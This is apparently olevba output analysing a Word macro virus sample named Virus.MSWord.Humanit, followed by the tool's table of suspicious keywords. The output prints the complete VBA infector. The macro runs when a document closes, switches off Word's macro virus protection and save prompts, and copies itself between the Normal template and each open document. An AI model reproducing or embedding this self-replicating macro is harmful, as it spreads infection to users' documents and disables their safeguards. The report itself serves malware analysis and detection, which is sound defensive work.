olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Humanit
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Humanit - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Rem Humanitvir
cisti:
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Set n = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set d = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
If n.Lines(4, 1) <> "cisti:" Then
Do Until n.CountOfLines = 0
n.DeleteLines 1, 1
Loop
For a = 1 To d.CountOfLines
n.InsertLines a, d.Lines(a, 1)
Next a
End If
If d.Lines(4, 1) <> "cisti:" Then
Do Until d.CountOfLines = 0
d.DeleteLines 1, 1
Loop
For a = 1 To n.CountOfLines
d.InsertLines a, n.Lines(a, 1)
Next a
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

